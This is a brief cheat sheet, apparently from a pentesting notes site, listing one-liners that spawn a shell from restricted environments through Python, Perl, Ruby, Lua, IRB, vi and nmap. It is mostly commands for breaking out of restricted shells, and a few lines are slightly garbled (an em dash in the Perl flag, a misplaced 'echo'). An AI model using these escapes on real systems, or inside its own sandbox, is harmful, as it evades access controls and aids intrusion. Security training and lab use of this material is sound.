---
title: Spawn
author: i4
date: M11-02-2022
---
# Spawn /bin/sh from restricted environments

Ways to escape a restricted environment

### Python 3
```python
python3
python -c 'import pty; pty.spawn("/bin/sh")'
```
### Python 2
```python
python2
echo os.system('/bin/bash')
```
### sh
```sh
/bin/sh -i
```
### Perl
```perl
exec "/bin/sh";
perl —e 'exec "/bin/sh";'
```
### Ruby
```Ruby
exec "/bin/sh"
```
### lua
```lua
os.execute('/bin/sh')
```
### From within IRB
```bash
exec "/bin/sh"
```
### From within vi
```bash
:!bash
:set shell=/bin/bash:shell
``` 
### Within nmap
```bash
!sh
```
